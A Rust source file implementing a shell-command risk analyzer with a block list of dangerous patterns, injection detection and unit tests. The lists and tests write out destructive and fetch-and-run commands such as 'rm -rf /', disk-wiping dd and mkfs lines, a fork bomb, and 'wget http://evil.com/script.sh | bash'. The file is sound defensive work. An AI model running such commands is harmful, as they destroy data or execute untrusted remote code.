// MIT License
// Copyright (c) 2026 190615273@qq.com
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

use std::ffi::{CStr, CString};
use std::os::raw::c_char;
use crate::json_util::JsonValue;

const DANGEROUS_PATTERNS: &[&str] = &[
    "rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf .",
    "dd if=", "mkfs.", "fdisk", "format ",
    ":(){ :|:& };:", "fork bomb",
    "chmod 777", "chmod 4755",
    "chown -R ", "> /dev/sda", "> /dev/sdb",
    "wget ", "curl ", "| sh", "| bash",
    "eval ", "exec ", "source ",
];

const DANGEROUS_COMMANDS: &[&str] = &[
    "sudo", "su", "passwd", "kill", "pkill",
    "systemctl", "service", "init",
];

fn count_dangerous_patterns(command: &str) -> i32 {
    let lower = command.to_lowercase();
    DANGEROUS_PATTERNS.iter().filter(|&&p| {
        if p.ends_with(' ') {
            lower.contains(p)
        } else {
            lower.contains(p)
        }
    }).count() as i32
}

fn find_matching_patterns(command: &str) -> Vec<(String, String)> {
    let lower = command.to_lowercase();
    let mut results = Vec::new();
    for &p in DANGEROUS_PATTERNS {
        if lower.contains(p) {
            results.push(("dangerous_pattern".to_string(), p.to_string()));
        }
    }
    for &c in DANGEROUS_COMMANDS {
        if lower.starts_with(c) || lower.contains(&format!(" {}", c)) {
            results.push(("dangerous_command".to_string(), c.to_string()));
        }
    }
    results
}

fn has_injection(command: &str) -> Vec<String> {
    let mut detections = Vec::new();
    if command.contains("$(") {
        detections.push("command_substitution".to_string());
    }
    if command.contains('`') {
        detections.push("backtick".to_string());
    }
    if command.contains(";\n") || command.contains("; ") {
        detections.push("semicolon_chaining".to_string());
    }
    if command.contains("&& curl") || command.contains("&& wget") {
        detections.push("or_operator_abuse".to_string());
    }
    for ch in command.chars() {
        if ch as u32 == 0x200B || ch as u32 == 0x200C || ch as u32 == 0x200D
            || ch as u32 == 0xFEFF || ch as u32 == 0x202E
        {
            detections.push("zero_width_unicode".to_string());
            break;
        }
    }
    if command.contains('\0') {
        detections.push("null_byte_injection".to_string());
    }
    detections
}

fn analyze_bash_command_impl(command: &str) -> String {
    let lower = command.to_lowercase();

    let dangerous_count = count_dangerous_patterns(command);
    let injections = has_injection(command);
    let patterns = find_matching_patterns(command);

    let mut has_sudo_escalation = false;
    if lower.contains("sudo") && (lower.contains("root") || command.contains("-u root")) {
        has_sudo_escalation = true;
    }
    let has_chmod_escalation = lower.contains("chmod") && (lower.contains("777") || lower.contains("4755"));
    let has_rm_destructive = lower.contains("rm -rf") || lower.contains("rm -r /");

    let risk_level = if has_rm_destructive {
        "dangerous"
    } else if has_sudo_escalation || has_chmod_escalation || dangerous_count > 2 {
        "suspicious"
    } else if dangerous_count > 0 || !injections.is_empty() {
        "suspicious"
    } else {
        "safe"
    };

    let matches: Vec<JsonValue> = patterns.iter().map(|(t, v)| {
        let mut obj = std::collections::BTreeMap::new();
        obj.insert("type".to_string(), JsonValue::String(t.clone()));
        obj.insert("pattern".to_string(), JsonValue::String(v.clone()));
        JsonValue::Object(obj)
    }).collect();

    let injection_types: Vec<JsonValue> = injections.iter().map(|i| JsonValue::String(i.clone())).collect();

    let mut result_obj = std::collections::BTreeMap::new();
    result_obj.insert("risk_level".to_string(), JsonValue::String(risk_level.to_string()));
    result_obj.insert("matches".to_string(), JsonValue::Array(matches));
    result_obj.insert("injection_types".to_string(), JsonValue::Array(injection_types));
    result_obj.insert("dangerous_count".to_string(), JsonValue::Number(dangerous_count as f64));

    JsonValue::Object(result_obj).to_json_string()
}

#[no_mangle]
pub extern "C" fn py_analyze_bash_command(command: *const c_char) -> *mut c_char {
    let cmd_str = unsafe { CStr::from_ptr(command) }.to_str().unwrap_or("");
    let result = analyze_bash_command_impl(cmd_str);
    CString::new(result).unwrap_or_default().into_raw()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_analyze_safe_command() {
        let json = analyze_bash_command_impl("ls -la");
        assert!(json.contains("\"risk_level\":\"safe\""));
        assert!(json.contains("\"dangerous_count\":0"));
    }

    #[test]
    fn test_analyze_safe_grep() {
        let json = analyze_bash_command_impl("grep 'pattern' file.txt");
        assert!(json.contains("\"risk_level\":\"safe\""));
    }

    #[test]
    fn test_analyze_rm_destructive() {
        let json = analyze_bash_command_impl("rm -rf /");
        assert!(json.contains("\"risk_level\":\"dangerous\""));
    }

    #[test]
    fn test_analyze_rm_rf_root() {
        let json = analyze_bash_command_impl("rm -r /var");
        assert!(json.contains("\"risk_level\":\"dangerous\""));
    }

    #[test]
    fn test_analyze_rm_rf_home() {
        let json = analyze_bash_command_impl("rm -rf ~");
        assert!(json.contains("\"risk_level\":\"dangerous\""));
    }

    #[test]
    fn test_analyze_chmod_777() {
        let json = analyze_bash_command_impl("chmod 777 file");
        assert!(json.contains("\"risk_level\":\"suspicious\""));
        assert!(json.contains("\"matches\""));
    }

    #[test]
    fn test_analyze_sudo() {
        let json = analyze_bash_command_impl("sudo apt-get update");
        assert!(json.contains("\"matches\""));
        assert!(json.contains("\"type\":\"dangerous_command\""));
    }

    #[test]
    fn test_analyze_command_substitution() {
        let json = analyze_bash_command_impl("echo $(whoami)");
        assert!(json.contains("\"injection_types\""));
        assert!(json.contains("\"command_substitution\""));
    }

    #[test]
    fn test_analyze_backtick_injection() {
        let json = analyze_bash_command_impl("echo `whoami`");
        assert!(json.contains("\"backtick\""));
    }

    #[test]
    fn test_analyze_curl_pipe_sh() {
        let json = analyze_bash_command_impl("curl http://example.com | sh");
        assert!(json.contains("\"matches\""));
    }

    #[test]
    fn test_analyze_mkfs() {
        let json = analyze_bash_command_impl("mkfs.ext4 /dev/sda1");
        assert!(json.contains("\"matches\""));
    }

    #[test]
    fn test_analyze_dd() {
        let json = analyze_bash_command_impl("dd if=/dev/zero of=/dev/sda");
        assert!(json.contains("\"matches\""));
    }

    #[test]
    fn test_analyze_wget_pipe_bash() {
        let json = analyze_bash_command_impl("wget http://evil.com/script.sh | bash");
        assert!(json.contains("\"matches\""));
    }

    #[test]
    fn test_analyze_eval() {
        let json = analyze_bash_command_impl("eval \"$(curl -s http://example.com)\"");
        assert!(json.contains("\"matches\""));
    }

    #[test]
    fn test_analyze_combined_threat() {
        let json = analyze_bash_command_impl("sudo rm -rf / && chmod 777 /etc");
        assert!(!json.contains("\"risk_level\":\"safe\""));
    }

    #[test]
    fn test_analyze_empty() {
        let json = analyze_bash_command_impl("");
        assert!(json.contains("\"risk_level\":\"safe\""));
    }

    #[test]
    fn test_analyze_injection_semicolon() {
        let json = analyze_bash_command_impl("ls; rm -rf /");
        assert!(json.contains("\"semicolon_chaining\""));
    }

    #[test]
    fn test_count_dangerous_patterns_empty() {
        assert_eq!(count_dangerous_patterns(""), 0);
    }

    #[test]
    fn test_count_dangerous_patterns_safe() {
        assert_eq!(count_dangerous_patterns("ls -la"), 0);
    }

    #[test]
    fn test_count_dangerous_patterns_rm() {
        assert!(count_dangerous_patterns("rm -rf /") > 0);
    }

    #[test]
    fn test_find_matching_patterns_safe() {
        let results = find_matching_patterns("ls -la");
        assert!(results.is_empty());
    }

    #[test]
    fn test_find_matching_patterns_dangerous() {
        let results = find_matching_patterns("chmod 777 file");
        assert!(!results.is_empty());
    }

    #[test]
    fn test_has_injection_none() {
        let detections = has_injection("ls -la");
        assert!(detections.is_empty());
    }

    #[test]
    fn test_has_injection_command_substitution() {
        let detections = has_injection("echo $(pwd)");
        assert!(detections.contains(&"command_substitution".to_string()));
    }

    #[test]
    fn test_has_injection_backtick() {
        let detections = has_injection("echo `pwd`");
        assert!(detections.contains(&"backtick".to_string()));
    }

    #[test]
    fn test_has_injection_multiple() {
        let detections = has_injection("ls; echo `whoami` && curl x.com");
        assert!(detections.contains(&"semicolon_chaining".to_string()));
        assert!(detections.contains(&"backtick".to_string()));
    }

    #[test]
    fn test_analyze_single_dangerous_pattern() {
        let json = analyze_bash_command_impl("curl http://example.com");
        assert!(json.contains("\"risk_level\":\"suspicious\""));
    }

    #[test]
    fn test_analyze_null_byte() {
        let json = analyze_bash_command_impl("ls\0whoami");
        assert!(json.contains("\"null_byte_injection\""));
    }

    #[test]
    fn test_analyze_zero_width_unicode() {
        let json = analyze_bash_command_impl("ls\u{200B}whoami");
        assert!(json.contains("\"zero_width_unicode\""));
    }
}
